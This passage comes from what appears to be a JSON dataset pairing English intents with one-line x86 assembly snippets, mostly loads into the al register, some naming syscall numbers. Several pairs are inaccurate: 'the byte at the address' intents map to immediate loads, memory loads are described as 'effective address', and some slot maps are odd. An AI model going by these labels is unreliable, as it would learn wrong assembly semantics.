      "al",
      ",",
      "05h"
    ]
  },
  {
    "intent": "move 0x1 into lower byte of the eax register",
    "rewritten_intent": "move 0x1 into lower byte of the eax register",
    "snippet": "mov al, 0x01",
    "slot_map": {
      "0x1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "lower",
      "byte",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x01"
    ]
  },
  {
    "intent": "move 0x01 into al",
    "rewritten_intent": "move 0x01 into al",
    "snippet": "mov al, 0x01",
    "slot_map": {
      "0x01": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x04 into al",
    "rewritten_intent": "move 0x04 into al",
    "snippet": "mov al, 0x04",
    "slot_map": {
      "0x04": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x5 into the al register",
    "rewritten_intent": "put the syscall 0x5 into the al register",
    "snippet": "mov al, 0x05",
    "slot_map": {
      "0x5": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x05"
    ]
  },
  {
    "intent": "move 0x06 into al",
    "rewritten_intent": "move 0x06 into al",
    "snippet": "mov al, 0x06",
    "slot_map": {
      "0x06": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x0a into al",
    "rewritten_intent": "move 0x0a into al",
    "snippet": "mov al, 0x0a",
    "slot_map": {
      "0x0a": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x0b into al",
    "rewritten_intent": "move 0x0b into al",
    "snippet": "mov al, 0x0b",
    "slot_map": {
      "0x0b": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x1 into the al register",
    "rewritten_intent": "move the value 0x1 into the al register",
    "snippet": "mov al, 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1 into lower byte of the eax register",
    "rewritten_intent": "move 0x1 into lower byte of the eax register",
    "snippet": "mov al, 0x1",
    "slot_map": {
      "0x1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "lower",
      "byte",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x17 into al",
    "rewritten_intent": "move 0x17 into al",
    "snippet": "mov al, 0x17",
    "slot_map": {
      "0x17": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1f into al",
    "rewritten_intent": "move 0x1f into al",
    "snippet": "mov al, 0x1f",
    "slot_map": {
      "0x1f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x2 into the al register",
    "rewritten_intent": "put the syscall 0x2 into the al register",
    "snippet": "mov al, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x21 into al",
    "rewritten_intent": "move 0x21 into al",
    "snippet": "mov al, 0x21",
    "slot_map": {
      "0x21": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2e into al",
    "rewritten_intent": "move 0x2e into al",
    "snippet": "mov al, 0x2e",
    "slot_map": {
      "0x2e": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3 into al",
    "rewritten_intent": "move 0x3 into al",
    "snippet": "mov al, 0x3",
    "slot_map": {
      "0x3": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x30 into al",
    "rewritten_intent": "move 0x30 into al",
    "snippet": "mov al, 0x30",
    "slot_map": {
      "0x30": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x33 into al",
    "rewritten_intent": "move 0x33 into al",
    "snippet": "mov al, 0x33",
    "slot_map": {
      "0x33": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3f into al",
    "rewritten_intent": "move 0x3f into al",
    "snippet": "mov al, 0x3f",
    "slot_map": {
      "0x3f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "syscall 63",
    "rewritten_intent": "syscall 63",
    "snippet": "mov al, 0x3f",
    "slot_map": {},
    "intent_tokens": [
      "syscall",
      "63"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x3f"
    ]
  },
  {
    "intent": "move the value 0x4 into the al register",
    "rewritten_intent": "move the value 0x4 into the al register",
    "snippet": "mov al, 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x4 into al",
    "rewritten_intent": "move 0x4 into al",
    "snippet": "mov al, 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x42 into al",
    "rewritten_intent": "move 0x42 into al",
    "snippet": "mov al, 0x42",
    "slot_map": {
      "0x42": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x46 into al",
    "rewritten_intent": "move 0x46 into al",
    "snippet": "mov al, 0x46",
    "slot_map": {
      "0x46": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x5 into the al register",
    "rewritten_intent": "move the value 0x5 into the al register",
    "snippet": "mov al, 0x5",
    "slot_map": {
      "0x5": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x5 into al",
    "rewritten_intent": "move 0x5 into al",
    "snippet": "mov al, 0x5",
    "slot_map": {
      "0x5": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "load the syscall value 0x58 for reboot in the al register",
    "rewritten_intent": "load the syscall value 0x58 for reboot in the al register",
    "snippet": "mov al, 0x58",
    "slot_map": {
      "0x58": "var0",
      "for": "var1"
    },
    "intent_tokens": [
      "load",
      "syscall",
      "value",
      "var0",
      "var1",
      "reboot",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x6 into al",
    "rewritten_intent": "move 0x6 into al",
    "snippet": "mov al, 0x6",
    "slot_map": {
      "0x6": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "make the socketcall",
    "rewritten_intent": "make the socketcall",
    "snippet": "mov al, 0x66",
    "slot_map": {
      "socketcall": "var0"
    },
    "intent_tokens": [
      "make",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x66"
    ]
  },
  {
    "intent": "make the systemcall socketcall",
    "rewritten_intent": "make the systemcall socketcall",
    "snippet": "mov al, 0x66",
    "slot_map": {
      "systemcall": "var0",
      "socketcall": "var1"
    },
    "intent_tokens": [
      "make",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x66"
    ]
  },
  {
    "intent": "move 0x66 into al",
    "rewritten_intent": "move 0x66 into al",
    "snippet": "mov al, 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "syscall 102",
    "rewritten_intent": "syscall 102",
    "snippet": "mov al, 0x66",
    "slot_map": {},
    "intent_tokens": [
      "syscall",
      "102"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x66"
    ]
  },
  {
    "intent": "system call socketcall",
    "rewritten_intent": "system call socketcall",
    "snippet": "mov al, 0x66",
    "slot_map": {
      "socketcall": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0x66"
    ]
  },
  {
    "intent": "move 0x7 into al",
    "rewritten_intent": "move 0x7 into al",
    "snippet": "mov al, 0x7",
    "slot_map": {
      "0x7": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x8 into the al register",
    "rewritten_intent": "put the syscall 0x8 into the al register",
    "snippet": "mov al, 0x8",
    "slot_map": {
      "0x8": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xa2 into al",
    "rewritten_intent": "move 0xa2 into al",
    "snippet": "mov al, 0xa2",
    "slot_map": {
      "0xa2": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "execve system call number 11",
    "rewritten_intent": "execve system call number 11",
    "snippet": "mov al, 0xb",
    "slot_map": {},
    "intent_tokens": [
      "execve",
      "system",
      "call",
      "number",
      "11"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "0xb"
    ]
  },
  {
    "intent": "mov 0xb into lower byte of eax",
    "rewritten_intent": "mov 0xb into lower byte of eax",
    "snippet": "mov al, 0xb",
    "slot_map": {
      "0xb": "var1",
      "mov": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "lower",
      "byte",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move 0xb into al",
    "rewritten_intent": "move 0xb into al",
    "snippet": "mov al, 0xb",
    "slot_map": {
      "0xb": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xb5 into al",
    "rewritten_intent": "move 0xb5 into al",
    "snippet": "mov al, 0xb5",
    "slot_map": {
      "0xb5": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xcd into al",
    "rewritten_intent": "move 0xcd into al",
    "snippet": "mov al, 0xcd",
    "slot_map": {
      "0xcd": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xf into al",
    "rewritten_intent": "move 0xf into al",
    "snippet": "mov al, 0xf",
    "slot_map": {
      "0xf": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 1 into the al register",
    "rewritten_intent": "move the value 1 into the al register",
    "snippet": "mov al, 1",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "value",
      "1",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "1"
    ]
  },
  {
    "intent": "move 1 into al",
    "rewritten_intent": "move 1 into al",
    "snippet": "mov al, 1",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "1",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "1"
    ]
  },
  {
    "intent": "transfer the value 10 to the al register",
    "rewritten_intent": "transfer the value 10 to the al register",
    "snippet": "mov al, 10",
    "slot_map": {},
    "intent_tokens": [
      "transfer",
      "value",
      "10",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 102 into al",
    "rewritten_intent": "move 102 into al",
    "snippet": "mov al, 102",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "102",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "102"
    ]
  },
  {
    "intent": "put the syscall 11 into the al register",
    "rewritten_intent": "put the syscall 11 into the al register",
    "snippet": "mov al, 11",
    "slot_map": {},
    "intent_tokens": [
      "put",
      "syscall",
      "11",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "11"
    ]
  },
  {
    "intent": "move the value 11 into the al register",
    "rewritten_intent": "move the value 11 into the al register",
    "snippet": "mov al, 11",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "value",
      "11",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "11"
    ]
  },
  {
    "intent": "move 12 into al",
    "rewritten_intent": "move 12 into al",
    "snippet": "mov al, 12",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "12",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "12"
    ]
  },
  {
    "intent": "move 15 into lower byte of the eax register",
    "rewritten_intent": "move 15 into lower byte of the eax register",
    "snippet": "mov al, 15",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "15",
      "lower",
      "byte",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "15"
    ]
  },
  {
    "intent": "move 16 into al",
    "rewritten_intent": "move 16 into al",
    "snippet": "mov al, 16",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "16",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "16"
    ]
  },
  {
    "intent": "move 2 into al",
    "rewritten_intent": "move 2 into al",
    "snippet": "mov al, 2",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "2",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "2"
    ]
  },
  {
    "intent": "move 20 into al",
    "rewritten_intent": "move 20 into al",
    "snippet": "mov al, 20",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "20",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "20"
    ]
  },
  {
    "intent": "move 23 into al",
    "rewritten_intent": "move 23 into al",
    "snippet": "mov al, 23",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "23",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "23"
    ]
  },
  {
    "intent": "move 37 into al",
    "rewritten_intent": "move 37 into al",
    "snippet": "mov al, 37",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "37",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "37"
    ]
  },
  {
    "intent": "move 39 into al",
    "rewritten_intent": "move 39 into al",
    "snippet": "mov al, 39",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "39",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "39"
    ]
  },
  {
    "intent": "store 4 into al",
    "rewritten_intent": "store 4 into al",
    "snippet": "mov al, 4",
    "slot_map": {},
    "intent_tokens": [
      "store",
      "4",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 4 into al",
    "rewritten_intent": "move 4 into al",
    "snippet": "mov al, 4",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "4",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 5 into al",
    "rewritten_intent": "move 5 into al",
    "snippet": "mov al, 5",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "5",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "5"
    ]
  },
  {
    "intent": "move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero",
    "rewritten_intent": "move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero",
    "snippet": "mov al, 5 \\n dec al \\n jnz l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "5",
      "al",
      "register",
      "then",
      "decrement",
      "contents",
      "al",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "5",
      "\\n",
      "dec",
      "al",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "move 54 into al",
    "rewritten_intent": "move 54 into al",
    "snippet": "mov al, 54",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "54",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "54"
    ]
  },
  {
    "intent": "move 6 into al",
    "rewritten_intent": "move 6 into al",
    "snippet": "mov al, 6",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "6",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "6"
    ]
  },
  {
    "intent": "move 61 into al",
    "rewritten_intent": "move 61 into al",
    "snippet": "mov al, 61",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "61",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "61"
    ]
  },
  {
    "intent": "save 63 into al",
    "rewritten_intent": "save 63 into al",
    "snippet": "mov al, 63",
    "slot_map": {},
    "intent_tokens": [
      "save",
      "63",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "63"
    ]
  },
  {
    "intent": "move 66h into al",
    "rewritten_intent": "move 66h into al",
    "snippet": "mov al, 66h",
    "slot_map": {
      "66h": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 70 into al",
    "rewritten_intent": "move 70 into al",
    "snippet": "mov al, 70",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "70",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "70"
    ]
  },
  {
    "intent": "move 72h into al",
    "rewritten_intent": "move 72h into al",
    "snippet": "mov al, 72h",
    "slot_map": {
      "72h": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 99 into al",
    "rewritten_intent": "move 99 into al",
    "snippet": "mov al, 99",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "99",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "99"
    ]
  },
  {
    "intent": "move data at memory location a_letter into al",
    "rewritten_intent": "move data at memory location a_letter into al",
    "snippet": "mov al, a_letter",
    "slot_map": {
      "a_letter": "var0"
    },
    "intent_tokens": [
      "move",
      "data",
      "memory",
      "location",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the effective address of digits+eax into al",
    "rewritten_intent": "move the effective address of digits+eax into al",
    "snippet": "mov al, byte [digits+eax]",
    "slot_map": {
      "digits+eax": "var0"
    },
    "intent_tokens": [
      "move",
      "effective",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte in edi into the al register",
    "rewritten_intent": "move the byte in edi into the al register",
    "snippet": "mov al, byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the effective address edx+ecx into al",
    "rewritten_intent": "move the effective address edx+ecx into al",
    "snippet": "mov al, byte [edx+ecx]",
    "slot_map": {
      "edx+ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "effective",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte 0bh into al",
    "rewritten_intent": "move the byte 0bh into al",
    "snippet": "mov al, byte 0bh",
    "slot_map": {
      "0bh": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 0bh into al",
    "rewritten_intent": "move the byte at the address 0bh into al",
    "snippet": "mov al, byte 0bh",
    "slot_map": {
      "0bh": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 0x1 into al",
    "rewritten_intent": "move the byte at the address 0x1 into al",
    "snippet": "mov al, byte 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte 2ah into al",
    "rewritten_intent": "move the byte 2ah into al",
    "snippet": "mov al, byte 2ah",
    "slot_map": {
      "2ah": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 2ah into al",
    "rewritten_intent": "move the byte at the address 2ah into al",
    "snippet": "mov al, byte 2ah",
    "slot_map": {
      "2ah": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte 2h into al",
    "rewritten_intent": "move the byte 2h into al",
    "snippet": "mov al, byte 2h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "byte",
      "2h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "2h"
    ]
  },
  {
    "intent": "move the byte at the address 2h into al",
    "rewritten_intent": "move the byte at the address 2h into al",
    "snippet": "mov al, byte 2h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "2h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "2h"
    ]
  },
  {
    "intent": "move the byte 3fh into al",
    "rewritten_intent": "move the byte 3fh into al",
    "snippet": "mov al, byte 3fh",
    "slot_map": {
      "3fh": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 3fh into al",
    "rewritten_intent": "move the byte at the address 3fh into al",
    "snippet": "mov al, byte 3fh",
    "slot_map": {
      "3fh": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte 3h into al",
    "rewritten_intent": "move the byte 3h into al",
    "snippet": "mov al, byte 3h",
    "slot_map": {
      "3h": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 3h into al",
    "rewritten_intent": "move the byte at the address 3h into al",
    "snippet": "mov al, byte 3h",
    "slot_map": {
      "3h": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte 66h into al",
    "rewritten_intent": "move the byte 66h into al",
    "snippet": "mov al, byte 66h",
    "slot_map": {
      "66h": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte at the address 66h into al",
    "rewritten_intent": "move the byte at the address 66h into al",
    "snippet": "mov al, byte 66h",
    "slot_map": {
      "66h": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the byte 6h into al",
    "rewritten_intent": "move the byte 6h into al",
    "snippet": "mov al, byte 6h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "byte",
      "6h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "6h"
    ]
  },
  {
    "intent": "move the byte at the address 6h into al",
    "rewritten_intent": "move the byte at the address 6h into al",
    "snippet": "mov al, byte 6h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "6h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "6h"
    ]
  },
  {
    "intent": "move a byte from the address buff+ecx into al",
    "rewritten_intent": "move a byte from the address buff+ecx into al",
    "snippet": "mov al, byte[buff+ecx]",
    "slot_map": {
      "buff+ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move close_syscall into al",
    "rewritten_intent": "move close_syscall into al",
    "snippet": "mov al, close_syscall",
    "slot_map": {
      "close_syscall": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move write_syscall into al",
    "rewritten_intent": "move write_syscall into al",
    "snippet": "mov al, write_syscall",
    "slot_map": {
      "write_syscall": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "load the object at the address 1000h into the ax register",
    "rewritten_intent": "load the object at the address 1000h into the ax register",
    "snippet": "mov ax, [1000h]",
    "slot_map": {},
    "intent_tokens": [
      "load",
      "object",
      "address",
      "1000h",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "[",
      "1000h",
      "]"
    ]
  },
  {
    "intent": "copy thevalue at memory address specified by di into ax",
    "rewritten_intent": "copy thevalue at memory address specified by di into ax",
    "snippet": "mov ax, [di]",
    "slot_map": {
      "thevalue": "var0",
      "di": "var1"
    },
    "intent_tokens": [
      "copy",
      "var0",
      "memory",
      "address",
      "specified",
      "var1",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "store the contents at the address pointed by esi into the ax register",
    "rewritten_intent": "store the contents at the address pointed by esi into the ax register",
    "snippet": "mov ax, [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "contents",
      "address",
      "pointed",
      "var0",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "copy my_var contents in ax",
    "rewritten_intent": "copy my_var contents in ax",
    "snippet": "mov ax, [my_var]",
    "slot_map": {
      "my_var": "var0"
    },
    "intent_tokens": [
      "copy",
      "var0",
      "contents",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "initialize ax to 00",
    "rewritten_intent": "initialize ax to 00",
